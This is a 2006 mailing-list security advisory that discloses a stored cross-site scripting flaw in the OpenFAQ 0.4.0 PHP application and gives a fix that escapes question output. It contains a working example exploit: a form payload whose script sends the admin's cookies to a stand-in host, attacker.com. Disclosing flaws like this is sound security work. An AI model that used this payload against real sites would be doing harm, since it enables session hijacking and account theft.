
Date: Sat, 6 May 2006 02:47:22 +0200
From: Kamil Sienicki <K3@...lunca.int.pl>
To: bugtraq@...urityfocus.com
Cc: news@...uriteam.com
Subject: OpenFAQ - HTML injection and XSS (Cross Site Scripting)


Script: OpenFAQ
Version: 0.4.0 previous version probably too.
Language: PHP
Problem: HTML injection and XSS (Cross Site Scripting)
Vendor: http://sourceforge.net/projects/openfaq
Discovered by: Kamil 'K3' Sienicki

Description:
OpenFAQ is a PHP application that lets Webmasters 
administrate a Frequently Asked Questions section on their Web site. 
It has an admin section for easily adding questions and answers and 
editing the general configuration.

Problem:
A remote user can send via form a specially crafted data.
When admin try to validate questions in administration panel, 
specially crafted data will be executed.

Example exploit:
<form action=http://host/openfaq-0.4.0/submit.php?ask=go method=post>
<input type=text name=q
value="<SCRIPT>document.location='http://attacker.com/get.cgi?
value='+escape(document.cookie)</SCRIPT>">
<input type=hidden name=email>
<input type=submit value=Submit>
</form>

Example fix:
file validate.php
35  while ($row = mysql_fetch_array($get_new)) {
36    echo "<b>".htmlspecialchars($row[question])."</b> (<a
href=delete.php?type=n&id=$row[id]>$lang[delete]</a>, <a
href=edit.php?type=n&id=$row[id]>$lang[editpublish]</a>)<br />";
37  }
38 }

--
Kamil 'K3' Sienicki


